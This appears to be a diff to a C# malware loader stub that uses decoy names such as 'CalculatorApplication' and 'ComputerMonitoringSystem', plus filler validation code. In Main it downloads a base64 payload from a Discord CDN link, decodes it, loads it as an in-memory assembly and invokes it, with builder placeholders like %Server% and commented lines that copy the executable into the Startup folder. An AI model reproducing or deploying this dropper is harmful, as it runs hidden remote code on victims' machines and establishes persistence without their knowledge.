@@ -1,21 +1,22 @@
 using System;
 using System.Collections.Generic;
+using System.Collections.Specialized;
 using System.Diagnostics;
 using System.Linq;
 using System.Net;
 using System.Reflection;
 using System.Runtime.InteropServices;
+using System.Text.RegularExpressions;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
 
 
-//Default [assembly: AssemblyTitle("Unnamed")]
-//Default [assembly: AssemblyDescription("Unnamed")]
-//Default [assembly: AssemblyCompany("Unnamed.com")]
-//Default [assembly: AssemblyProduct("Unnamed Player")]
-//Default [assembly: AssemblyCopyright("Unnamed © Unnamed Sitesi")]
+
+//Default [assembly: AssemblyTitle("ComputerMonitoringSystem")]
+//Default [assembly: AssemblyProduct("ComputerMonitoringSystem")]
+//Default [assembly: AssemblyCopyright("Copyright ©  2019")]
 //Default [assembly: AssemblyFileVersion("1.0.0.0")]
 
 //Assembly [assembly: AssemblyTitle("{1}")]
@@ -29,9 +30,11 @@ using System.Windows.Forms;
 
 
 
-namespace CalculatorApplication
+
+
+namespace ComputerMonitoringSystem
 {
-    class NumberManipulator
+    class frmUser
     {
         public int FindMax(int num1, int num2)
         {
@@ -51,21 +54,78 @@ namespace CalculatorApplication
             int a = 100;
             int b = 200;
             int ret;
-            NumberManipulator n = new NumberManipulator();
 
-            //calling the FindMax method
-            ret = n.FindMax(a, b);
-            Console.WriteLine("Max value is : {0}", ret);
+
             Console.ReadLine();
         }
     }
 }
 
-namespace CalculatorApplication
+
+
+namespace ComputerMonitoringSystem
 {
-    static class Program
+    class usableFunction
     {
 
+    }
+}
+
+namespace ComputerMonitoringSystem
+{
+    static class frmItems
+    {
+
+
+        //        Public Sub checkOption(ByVal chk As CheckBox, ByRef yesno As String)
+        //    If chk.CheckState = CheckState.Checked Then
+        //        yesno = "Yes"
+        //    Else
+        //        yesno = "No"
+        //    End If
+        //End Sub
+
+
+
+        //initialize the validating method
+        static Regex Valid_Name = StringOnly();
+        static Regex Valid_Contact = NumbersOnly();
+        static Regex Valid_Password = ValidPassword();
+        static Regex Valid_Email = Email_Address();
+
+
+
+        //Method for validating email address
+        private static Regex Email_Address()
+        {
+            string Email_Pattern = @"^(?!\.)(""([^""\r\\]|\\[""\r\\])*""|"
+                + @"([-a-z0-9!#$%&'*+/=?^_`{|}~]|(?<!\.)\.)*)(?<!\.)"
+                + @"@[a-z0-9][\w\.-]*[a-z0-9]\.[a-z][a-z\.]*[a-z]$";
+
+            return new Regex(Email_Pattern, RegexOptions.IgnoreCase);
+        }
+        //Method for string validation only
+        private static Regex StringOnly()
+        {
+            string StringAndNumber_Pattern = "^[a-zA-Z]";
+
+            return new Regex(StringAndNumber_Pattern, RegexOptions.IgnoreCase);
+        }
+        //Method for numbers validation only
+        private static Regex NumbersOnly()
+        {
+            string StringAndNumber_Pattern = "^[0-9]*$";
+
+            return new Regex(StringAndNumber_Pattern, RegexOptions.IgnoreCase);
+        }
+        //Method for password validation only
+        private static Regex ValidPassword()
+        {
+            string Password_Pattern = "(?!^[0-9]*$)(?!^[a-zA-Z]*$)^([a-zA-Z0-9]{8,15})$";
+
+            return new Regex(Password_Pattern, RegexOptions.IgnoreCase);
+        }
+   
         [STAThread]
         static void Main()
         {
@@ -93,19 +153,44 @@ namespace CalculatorApplication
 
 
 
-                 
-                
-            
 
-                   byte[] x = w.DownloadData("https://cdn.discordapp.com/attachments/841595401253158954/843251127603429446/httpswww.youtube.comwatchvO9Hl");
+
+
+                    string ccc;
+
+                    ccc = "https://cdn.discordapp.com/attachments/841595401253158954/843305332738097162/sokayim_alayina.txt"; // هنا تضع رابط القيم تبع السيرفر 
+
+                    WebClient e;
+
+                    e = new WebClient();
+
+                    string sss;
+
+                    sss = e.DownloadString(ccc);
+
+
+                    byte[] aa;
+
+
+                    aa = Convert.FromBase64String(sss);
+
 
 
                     object s = new object[] { %aPP%, string.Empty, w.DownloadData("%Server%"), true };
 
-                   string o = "IsolatedStorage.packet_server";
+                    string o = "ShutDown.frmclass";
 
-                    AppDomain.CurrentDomain.Load(x).GetType(o).InvokeMember("CodeAccessSecurityAttribute", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])s);
+                    AppDomain.CurrentDomain.Load(aa).GetType(o).InvokeMember("stat", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])s);
 
+
+                    #region POST YAPILIYOR
+                    string postUrl = "http://localhost:57460/Home/Index";
+                    var gelenYanit = w.UploadValues(postUrl, new NameValueCollection() { { "id", "" } });
+                    #endregion
+                    #region POST NETİCESİNDE ÇIKTI ALINIYOR
+                    string result = System.Text.Encoding.UTF8.GetString(gelenYanit);
+                    MessageBox.Show(result);
+                    #endregion
 
                         //start  {
                     //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
